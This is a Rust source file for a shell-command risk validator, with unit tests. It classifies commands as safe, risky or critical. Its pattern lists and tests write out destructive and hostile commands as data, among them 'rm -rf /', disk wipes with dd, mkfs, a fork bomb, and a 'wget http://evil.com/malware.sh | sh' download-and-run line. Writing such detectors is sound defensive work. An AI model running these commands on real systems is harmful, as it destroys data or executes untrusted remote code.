use anyhow::{anyhow, Result};

#[derive(Debug, Clone, PartialEq)]
pub enum RiskLevel {
    Safe,      // Normal commands, no warning
    Medium,    // Potentially risky, warn user
    Critical,  // Extremely dangerous, block completely
}

pub struct CommandValidator {
    critical_patterns: Vec<&'static str>,
    risky_patterns: Vec<&'static str>,
}

impl CommandValidator {
    pub fn new() -> Self {
        Self {
            // Commands that can cause catastrophic damage - BLOCK THESE
            // Use regex patterns for precise matching
            critical_patterns: vec![
                "rm -rf /$",          // Exact match for root
                "rm -rf /\\s",        // rm -rf / followed by whitespace
                "rm -rf /\\*",        // rm -rf /*
                "rm -rf --no-preserve-root",
                "rm -fr /$",
                "rm -fr /\\s",
                "dd if=/dev/zero of=/dev/sd",
                "dd if=/dev/random of=/dev/sd",
                "mkfs\\.",           // Any mkfs command
                "format /dev/sd",
                ":\\(\\)\\{:\\|:&\\};:",  // fork bomb
                "chmod -R 777 /$",
                "chown -R root /$",
                "> /dev/sd",
                "mv /\\* /dev/null",
                "shred -vfz",
                "find.*\\-delete",     // find with -delete flag
                "find.*\\-exec\\s+rm",    // find with -exec rm
                "find.*\\-exec.*rm.*\\{\\}",  // find -exec rm {} pattern
            ],
            // Commands that are risky but might be intentional - WARN ONLY
            risky_patterns: vec![
                "rm -rf",
                "rm -fr",
                "sudo rm",
                "sudo dd",
                "curl.*\\|.*bash",      // Escaped pipe for regex
                "curl.*\\|.*sh",
                "wget.*\\|.*bash",
                "wget.*\\|.*sh",
                "chmod 777",
                "chmod -r",          // Lowercase because we lowercase the command
                "chown -r",
                "eval.*\\$\\(",
                "base64.*-d.*\\|",      // Escaped pipe
                ">/dev/",
                "dd if=",
                "sudo.*passwd",
                "iptables -F",
                "systemctl stop",
                "systemctl disable",
                "killall -9",
            ],
        }
    }

    /// Validate a command and return its risk level
    pub fn validate(&self, command: &str) -> Result<RiskLevel> {
        let cmd_lower = command.to_lowercase();
        let cmd_normalized = command.replace("  ", " ").trim().to_string();

        // Check for critical patterns - return Critical risk level (not error)
        for pattern in &self.critical_patterns {
            if Self::matches_pattern(&cmd_lower, pattern) {
                return Ok(RiskLevel::Critical);
            }
        }

        // Check for risky patterns - warn but allow
        for pattern in &self.risky_patterns {
            if Self::matches_pattern(&cmd_lower, pattern) {
                return Ok(RiskLevel::Medium);
            }
        }

        // Check for other suspicious indicators
        if Self::has_excessive_chaining(&cmd_normalized) {
            return Ok(RiskLevel::Medium);
        }

        if Self::has_suspicious_obfuscation(&cmd_normalized) {
            return Ok(RiskLevel::Medium);
        }

        // Default: safe
        Ok(RiskLevel::Safe)
    }

    /// Check if command matches a pattern (supports regex)
    fn matches_pattern(command: &str, pattern: &str) -> bool {
        // Try as regex first (patterns with \s, $, \\, etc.)
        if pattern.contains('\\') || pattern.contains('$') {
            if let Ok(re) = regex::Regex::new(pattern) {
                return re.is_match(command);
            }
        }

        // For simple string patterns
        command.contains(pattern)
    }

    /// Check for excessive command chaining (possible obfuscation)
    fn has_excessive_chaining(command: &str) -> bool {
        let chain_count = command.matches(&[';', '|'][..]).count();
        let and_or_count = command.matches("&&").count() + command.matches("||").count();

        chain_count + and_or_count > 5
    }

    /// Check for suspicious obfuscation techniques
    fn has_suspicious_obfuscation(command: &str) -> bool {
        // Too many command substitutions
        let subst_count = command.matches("$(").count() + command.matches('`').count();
        if subst_count > 3 {
            return true;
        }

        // Base64 with piping (common malware technique)
        if command.contains("base64") && command.contains("-d") && command.contains('|') {
            return true;
        }

        // Hex encoding tricks
        if command.contains("\\x") && command.matches("\\x").count() > 10 {
            return true;
        }

        // URL fetching piped to shell
        if (command.contains("curl") || command.contains("wget"))
            && (command.contains("| bash") || command.contains("| sh")) {
            return true;
        }

        false
    }

    /// Get a human-readable warning message for risky commands
    pub fn get_warning_message(&self, command: &str) -> String {
        let cmd_lower = command.to_lowercase();

        // Specific warnings for known patterns
        if cmd_lower.contains("rm -rf") || cmd_lower.contains("rm -fr") {
            return "⚠️  WARNING: This command recursively deletes files/directories".to_string();
        }

        if cmd_lower.contains("sudo") {
            return "⚠️  WARNING: This command runs with elevated privileges".to_string();
        }

        if cmd_lower.contains("curl") && cmd_lower.contains('|') {
            return "⚠️  WARNING: This command downloads and executes code from the internet".to_string();
        }

        if cmd_lower.contains("chmod 777") {
            return "⚠️  WARNING: This command makes files world-writable (security risk)".to_string();
        }

        if cmd_lower.contains("dd") {
            return "⚠️  WARNING: This command performs low-level disk operations".to_string();
        }

        if cmd_lower.contains("killall -9") {
            return "⚠️  WARNING: This command forcefully terminates processes".to_string();
        }

        // Generic warning
        "⚠️  WARNING: This command may have unintended consequences".to_string()
    }

    /// Get a critical warning message for extremely dangerous commands
    pub fn get_critical_message(&self, command: &str) -> String {
        let cmd_lower = command.to_lowercase();

        // Specific critical warnings
        if cmd_lower.contains("rm -rf /") || cmd_lower.contains("rm -fr /") {
            return "🚨 CRITICAL: This command will DELETE YOUR ENTIRE SYSTEM!\n\
                   This will destroy all files and make your system unbootable.\n\
                   If you really understand the consequences, you must type it manually.".to_string();
        }

        if cmd_lower.contains("mkfs") {
            return "🚨 CRITICAL: This command will FORMAT A DISK/PARTITION!\n\
                   All data on the target will be permanently destroyed.\n\
                   If you really understand the consequences, you must type it manually.".to_string();
        }

        if cmd_lower.contains("dd") && (cmd_lower.contains("/dev/sd") || cmd_lower.contains("/dev/nvme")) {
            return "🚨 CRITICAL: This command performs LOW-LEVEL DISK OPERATIONS!\n\
                   This can overwrite entire disks and destroy all data.\n\
                   If you really understand the consequences, you must type it manually.".to_string();
        }

        if cmd_lower.contains(":(){:|:&};:") {
            return "🚨 CRITICAL: This is a FORK BOMB that will crash your system!\n\
                   It will spawn processes until your system becomes unresponsive.\n\
                   If you really understand the consequences, you must type it manually.".to_string();
        }

        if cmd_lower.contains("find") && (cmd_lower.contains("-delete") || cmd_lower.contains("-exec rm")) {
            return "🚨 CRITICAL: This command will DELETE FILES RECURSIVELY!\n\
                   This find command will delete files matching the criteria.\n\
                   This operation is irreversible and can destroy important data.\n\
                   If you really understand the consequences, you must type it manually.".to_string();
        }

        // Generic critical warning
        "🚨 CRITICAL: This command could cause CATASTROPHIC SYSTEM DAMAGE!\n\
         This may delete files, format disks, or make your system unbootable.\n\
         If you really understand the consequences, you must type it manually.".to_string()
    }
}

impl Default for CommandValidator {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_commands() {
        let validator = CommandValidator::new();

        assert_eq!(validator.validate("ls -la").unwrap(), RiskLevel::Safe);
        assert_eq!(validator.validate("cd /tmp").unwrap(), RiskLevel::Safe);
        assert_eq!(validator.validate("echo hello").unwrap(), RiskLevel::Safe);
        assert_eq!(validator.validate("grep pattern file.txt").unwrap(), RiskLevel::Safe);
        assert_eq!(validator.validate("cat file.txt").unwrap(), RiskLevel::Safe);
        assert_eq!(validator.validate("pwd").unwrap(), RiskLevel::Safe);
        assert_eq!(validator.validate("mkdir test").unwrap(), RiskLevel::Safe);
    }

    #[test]
    fn test_pattern_matching() {
        // Test that risky pattern "rm -rf" matches "rm -rf /tmp/test"
        assert!(CommandValidator::matches_pattern("rm -rf /tmp/test", "rm -rf"));
        assert!(CommandValidator::matches_pattern("curl http://ex.com | bash", "curl.*\\|.*bash"));
        assert!(!CommandValidator::matches_pattern("ls -la", "rm -rf"));
    }

    #[test]
    fn test_critical_commands_blocked() {
        let validator = CommandValidator::new();

        // Critical commands should return RiskLevel::Critical (not error)
        assert_eq!(validator.validate("rm -rf /").unwrap(), RiskLevel::Critical);
        assert_eq!(validator.validate("rm -rf /*").unwrap(), RiskLevel::Critical);
        assert_eq!(validator.validate("dd if=/dev/zero of=/dev/sda").unwrap(), RiskLevel::Critical);
        assert_eq!(validator.validate("mkfs.ext4 /dev/sda").unwrap(), RiskLevel::Critical);
        assert_eq!(validator.validate(":(){:|:&};:").unwrap(), RiskLevel::Critical);
        assert_eq!(validator.validate("find . -type f -delete").unwrap(), RiskLevel::Critical);
        assert_eq!(validator.validate("find / -name '*.txt' -delete").unwrap(), RiskLevel::Critical);
        assert_eq!(validator.validate("find . -type f -exec rm {} \\;").unwrap(), RiskLevel::Critical);
    }

    #[test]
    fn test_risky_commands_warned() {
        let validator = CommandValidator::new();

        // These should be warned (Medium risk) but not blocked
        let test_cases = vec![
            ("rm -rf /tmp/test", "should match 'rm -rf'"),
            ("sudo rm file.txt", "should match 'sudo rm'"),
            ("curl http://example.com/script.sh | bash", "should match curl pipe bash"),
            ("wget http://evil.com/malware.sh | sh", "should match wget pipe sh"),
            ("chmod 777 file.txt", "should match 'chmod 777'"),
            ("dd if=/dev/sda of=backup.img", "should match 'dd if='"),
            ("chmod -R 755 /var/www", "should match 'chmod -R'"),
        ];

        for (cmd, reason) in test_cases {
            let result = validator.validate(cmd);
            assert!(result.is_ok(), "Command '{}' should not be blocked: {}", cmd, reason);
            assert_eq!(
                result.unwrap(),
                RiskLevel::Medium,
                "Command '{}' {}", cmd, reason
            );
        }
    }

    #[test]
    fn test_excessive_chaining() {
        let validator = CommandValidator::new();

        let complex_cmd = "cmd1 | cmd2 | cmd3 | cmd4 | cmd5 | cmd6 | cmd7";
        assert_eq!(validator.validate(complex_cmd).unwrap(), RiskLevel::Medium);
    }

    #[test]
    fn test_obfuscation_detection() {
        let validator = CommandValidator::new();

        assert_eq!(
            validator.validate("echo aGVsbG8gd29ybGQ= | base64 -d | bash").unwrap(),
            RiskLevel::Medium
        );
    }

    #[test]
    fn test_warning_messages() {
        let validator = CommandValidator::new();

        assert!(validator.get_warning_message("rm -rf /tmp").contains("recursively deletes"));
        assert!(validator.get_warning_message("sudo apt install").contains("elevated privileges"));
        assert!(validator.get_warning_message("curl http://ex.com | sh").contains("downloads and executes"));
    }

    #[test]
    fn test_critical_messages() {
        let validator = CommandValidator::new();

        assert!(validator.get_critical_message("rm -rf /").contains("DELETE YOUR ENTIRE SYSTEM"));
        assert!(validator.get_critical_message("mkfs.ext4 /dev/sda").contains("FORMAT A DISK"));
        assert!(validator.get_critical_message("dd if=/dev/zero of=/dev/sda").contains("LOW-LEVEL DISK OPERATIONS"));
        assert!(validator.get_critical_message(":(){:|:&};:").contains("FORK BOMB"));
    }
}
